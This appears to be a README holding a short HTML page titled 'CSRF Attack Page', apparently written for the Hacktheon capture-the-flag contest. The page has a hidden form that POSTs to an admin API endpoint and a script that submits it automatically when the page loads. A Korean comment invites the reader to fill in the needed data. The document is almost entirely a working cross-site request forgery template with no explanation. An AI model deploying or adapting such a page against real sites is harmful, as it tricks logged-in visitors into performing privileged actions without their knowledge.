# hi

<!DOCTYPE html>
<html>
<body>
    <h2>CSRF Attack Page</h2>
    <form action="https://githubreadme.hacktheon-ctf.org/api/admin" method="POST" id="csrf-form">
        <input type="hidden" name="someData" value="value" />
        <!-- 여기에 필요한 데이터를 추가하세요 -->
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
